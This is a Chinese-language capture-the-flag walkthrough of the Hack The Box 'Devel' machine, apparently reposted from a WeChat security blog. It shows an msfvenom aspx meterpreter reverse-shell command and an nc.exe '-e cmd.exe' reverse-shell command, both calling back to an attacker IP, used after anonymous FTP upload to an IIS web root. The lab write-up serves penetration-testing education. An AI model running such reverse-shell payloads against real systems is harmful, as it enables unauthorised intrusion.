> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0WwxXEeBoAL2r7aV6xSyWg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **71** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

靶机地址：https://www.hackthebox.eu/home/machines/profile/3

靶机难度：初级（3.9/10）

靶机发布日期：2017 年 10 月 3 日

靶机描述：

Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/wucQH64lHvpOxUzKZzgrk8rOIbSiaoFokwT3HYichsCpM6ibw80Jw5WmZL4vQs947UAIP2l7bicjV6MJECFp51G6sQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/XxrR38Omj5OU35wZiblPezbUu0aFe8g7adFDiar2por60icw9uh1XSFlykibc3jzCByDbG1hhhxNEk13P15Ofiam6Mg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_gif/z0LeJkZyUa7niaILpQLyj2SXVMFWPGRlKJVgNJ6OUubgicSlhy5yoOrKmqJ2dcAicOTFYG7FUAxFCCbYwz70WcaoQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29Gq1nRWV2WveCpVUMQa29XdZaV4wDicSrJMgeZ9CyBm6RVrNPzw2vTag/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.152..... 这台靶机是初学者级别的机器，可以使用公开的漏洞利用来完成...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29dbXt7sSgXd26Z2jtgMH15KA5Htt6uYG3jVEJdhfv1c1l4539IwB2xQ/640?wx_fmt=png)

Nmap 显示了 Microsoft FTP 服务器和 Microsoft IIS 服务器...

可以看到 FTP 允许登录，而且还有人在和我共享同一台靶机操作... 这么多文件...

其他文件不管的情况下，可以看到 FTP 存在 iisstart.htm 和 welcome.png 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29SKPdqt3psYYzIeiaIStlwwCu8ECEaicBa7zGiaqTM9bfiaBg7J6pnLnibJw/640?wx_fmt=png)

可以看到 web 访问说明，FTP 和 WEB 服务器存储的位置是相同的，那直接在 FTP 上传反弹 shell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/XxrR38Omj5OU35wZiblPezbUu0aFe8g7adFDiar2por60icw9uh1XSFlykibc3jzCByDbG1hhhxNEk13P15Ofiam6Mg/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_gif/z0LeJkZyUa7niaILpQLyj2SXVMFWPGRlKJVgNJ6OUubgicSlhy5yoOrKmqJ2dcAicOTFYG7FUAxFCCbYwz70WcaoQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

方法 1：

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29kMgL8Sd1mwKSsUycvnVuvdibKRUMgVYJCgiaAMS3nVbCgcMYvX3l2ynw/640?wx_fmt=png)

```
msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o dayu.aspx LHOST=10.10.14.23 LPORT=4444
```

利用 msfven.. 生成反弹 shell，上传到 FTP 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29bw5pmx4ic2vSMQ67AeWIZwWGG3qWYePjsHCZcL5qEiazlSUdYpwiciciaiaQ/640?wx_fmt=png)

成功获得了低权 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29ULqHMVB5yCwQqJicQudM89yAWb9LWd1H3hLJHSbh1EJGiacDZ053VB2A/640?wx_fmt=png)

利用 suggester 脚本进行漏扫，发现了这么多漏洞可利用！！随意用就能提权...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29BiaAqS6pdiaBkavoicibUXddynBtiboV3OAShiabjibqDuy8F0ESc4LkOicucw/640?wx_fmt=png)

这里比较无奈，很多人都在进攻这台靶机，弄得我经常 session 失效...

这里被迫重启了靶机，被人搞了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29B5xsfNACn6N1h2lpU5BYUiaEWw2knC2hBN1KvOJXXBlqL3twtPeMaDw/640?wx_fmt=png)

这里直接利用 migrate 提权了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29tOWtTacBbutIgeiciaZqWC7cGDxZgS8l5JqTWIuToqrCaxTJxQuXiaNow/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29WQuZS9qH9laUMFFiaolRaR9ztfCBvgS85Eye6CPQtvo5RPqOzC6wpdA/640?wx_fmt=png)

可以看到成功提权... 获得了 user 和 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

方法 2：

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29vIoZCHTrt4yVDYZicn1x3BtEUkcPKRvVre9f61fTBzot6xjmfGzicOPw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29xZqptSstPSWyafDicdYS0oQ991XVoqf90LBVZ4oaic4nzqtxne9UNNTA/640?wx_fmt=png)

利用本地 kali 自带的 cmd 注入 shell，成功可在 web 页面进行命令靶机系统命令操作...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29K2Jd7HEvr0iaxuWJSapGBjSJJ4CRtxZtqwPicQ4RGzAqbf9Phq1UEtWw/640?wx_fmt=png)

开启本地 smb...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ296NHeVtag33gzVibXa5zYC7KOLTY4xS5YoZULNLuJRWicZw9WibH4abqug/640?wx_fmt=png)

创建 smb 文件夹，放入 nc.exe...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29v0ib35R6rHD0RiczXicoict1qlxY5h6ZZOc34a6sVmIaMctiaIhUNoiaRskg/640?wx_fmt=png)

```
\\10.10.14.23\dayu\nc.exe -e cmd.exe 10.10.14.23 6666
```

成功获得外壳...

web 页面可以输入命令方式注入，那提权的方式太多了，powershell 等等... 跳过了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNzPJDkpSxOr3JP4USHCZ29GjD6tVwiaZaNMiaF8LSwKcEhicR4icq4nzA6f1w9Gpm4QnEtc1KCsFicubw/640?wx_fmt=png)

  

下面很简单了，前面 50 几 NO 的章节里，都写了很多种扫描脚本，上传发现漏洞即可... 然后根据 CVE 进行 EXE 下载，上传提权即可...

这里有人在搞我经常 down 机...

我就不操作了...

这台靶机很简单，初学者可以练练手！！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/wucQH64lHvpOxUzKZzgrk8rOIbSiaoFokwT3HYichsCpM6ibw80Jw5WmZL4vQs947UAIP2l7bicjV6MJECFp51G6sQ/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)